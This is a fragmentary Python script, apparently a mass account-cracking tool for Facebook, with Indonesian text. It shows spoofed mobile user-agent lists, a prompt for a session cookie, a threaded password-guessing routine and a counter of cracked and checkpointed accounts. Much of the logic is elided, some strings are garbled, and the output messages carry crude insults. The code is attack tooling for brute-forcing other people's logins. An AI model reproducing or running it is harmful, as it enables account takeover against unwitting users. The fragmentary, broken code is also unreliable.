...
pretty.install()
CON=sol()
ugen2=['Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/73.0.3683.121 MZBrowser/9.15.0 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/73.0.3683.121 MZBrowser/9.13.0 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 11; MEIZU 18) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 10; Redmi Y1 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25 .106;]']
ugen=['Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Redmi Y2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/71.0.3578.99 UCBrowser/12.10.0.1190 Mobile Safari/ 537,36']
ugen=['Mozilla/5.0 (Linux; Android 10; Redmi Y3 Build/QKQ1.191008.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/381.0 .0.17.102;]']
ugen=['Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/14.0 Mobile/15E148 Safari/604.1']
cokbrut=[]
...
|_     _|.----.---.-.--.--.-----.----.-----.
  |   |  |   _|  _  |  |  |  -__|   _|__ --|
  |___|  |__| |___._|\___/|_____|__| |_____|
  
{m}•{k}•{h}•{sir} Travers Recode {x}{m}•{k}•{h}•{x}''')
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tPESAN AUTHOR  : [green] COOKIEDOUGH [white] (;´༎ຶٹ༎ຶ`)'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] ENTER COOKIE :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL JALANKAN ULANG...!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL KONTOL....TUMBAL LU MOKAD  !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	cetak(nel('\tHELLOW [green]%s[white] KONTOLL'%(my_name)))
	
	alvino_xy(h+'>> Your Idz : '+str(my_id))
	print(h+ '>> version : 2,0' )
	print (h+">>"+h+" IP: "+ip)
	cetak(nel('\tTERUNTUK [green]%s CRACK SEWAJARNYA YA KONTOLL'%(my_name))) 
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedan Mendorong Gerobak  {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai, Ya adik adik[cyan] <<[white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r_[Traversxd] {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
